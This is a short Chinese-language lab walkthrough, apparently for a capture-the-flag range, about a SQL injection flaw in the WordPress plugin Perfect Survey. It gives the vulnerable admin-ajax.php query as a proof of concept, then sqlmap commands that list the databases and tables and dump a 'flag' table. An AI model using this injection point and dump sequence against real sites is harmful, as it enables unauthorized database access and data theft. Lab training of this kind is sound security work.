## **靶场介绍**

WordPress是一个使用PHP语言开发的内容管理系统（CMS），它极大地简化了构建博客或网站的过程，用户可以在支持PHP和MySQL数据库的服务器上架设属于自己的网站（博客）。WordPress不仅为大量商业网站和博客提供支持，它也是创建电子商务商店的流行方式，例如可以创建商业网站、电子商务商店、作品集网站、论坛、社交网络等。在Plugin
Perfect Survey存在sql注入漏洞

##  **开启靶场**

![1684050129_646090d13e0583c873b8d.png!small?1684050130440](https://image.3001.net/images/20230514/1684050129_646090d13e0583c873b8d.png!small?1684050130440)

##  **POC**

/wp-admin/admin-ajax.php?action=get_question&question_id=1

##  **解题步骤**

访问以下：

http://eci-2ze95j4wqbzeqf5mb1vf.cloudeci1.ichunqiu.com/wp-admin/admin-ajax.php?action=get_question&question_id=1

**![1684050207_6460911f152a4bf15a05b.png!small?1684050208216](https://image.3001.net/images/20230514/1684050207_6460911f152a4bf15a05b.png!small?1684050208216)**

 ** **通过sqlmap自动化工具测试****

Sqlmap -u “目标”

![1684050146_646090e20627240cda2ff.png!small?1684050147412](https://image.3001.net/images/20230514/1684050146_646090e20627240cda2ff.png!small?1684050147412)

  

 ** **查看所有数据库****

Sqlmap -u “目标” --dbs

![1684050229_6460913549e2725f86218.png!small?1684050230391](https://image.3001.net/images/20230514/1684050229_6460913549e2725f86218.png!small?1684050230391)

 ** **查看cms数据库中的表****

Sqlmap -u “目标” -D cms --tables

![1684050248_646091487919598085326.png!small?1684050249539](https://image.3001.net/images/20230514/1684050248_646091487919598085326.png!small?1684050249539)

 **读取cms数据库flag表中的值**

Sqlmap-u “目标”-D cms -T flag --dump

![1684050318_6460918e420f378bb06f6.png!small?1684050319168](https://image.3001.net/images/20230514/1684050318_6460918e420f378bb06f6.png!small?1684050319168)

